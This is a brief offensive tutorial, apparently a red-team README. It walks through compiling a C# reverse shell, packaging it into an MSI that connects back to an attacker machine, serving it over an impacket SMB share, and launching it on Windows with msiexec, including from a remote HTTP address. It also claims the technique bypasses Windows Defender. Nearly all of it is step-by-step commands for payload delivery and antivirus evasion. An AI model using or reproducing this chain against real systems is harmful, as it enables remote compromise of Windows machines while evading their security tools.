# First we need to compile the rev.cs with mono-csc if there is a problem with mono-csc apply "export TERM=dumb"

```bash
~$ sudo apt install mono-complete -y
~$ export TERM=dumb
~$ mono-csc rev.cs
```

# Modify the stage_impacket_smb_exe_loader.wxs to connect to the attacker machine

```bash
~$ sudo apt install wixl
~$ wixl stage_impacket_smb_exe_loader.wxs -a x64 -o smb.msi
```

# Share the directory through SMB where rev.exe is located

```bash
~$ impacket-smbserver -smb2support share .
```

# Share smb.msi and ejecute manual or with GUI on Windows:

```powershell
PS> Invoke-Item .\smb.msi
PS> ii .\smb.msi
PS> msiexec /i C:\CTIC\demo\smb.msi
PS> msiexec.exe /i http://192.168.10.13:9999/smb.msi
```


> [!NOTE]
> Only works with SMB not signed and bypass only Windows Defender, it was test against BitDefender EDR Free Trial and is bloqued

# Sources
- https://www.youtube.com/watch?v=9QXcBqej_iw&t=17s
- [wxs templates](https://github.com/OreoByte/cookies_and_scripts/blob/main/random_youtube_code_blocks/cross_buld_msi_video_extra_code_blocks.md)
- [Bypass Microsoft Defender with Sliver C2](https://github.com/TeneBrae93/defender_bypass_with_sliver/blob/main/builder.py)
- [Yet another FAFO project: Fileless code execution by abusing MSI installer files](https://github.com/ccelikanil/DFMI)
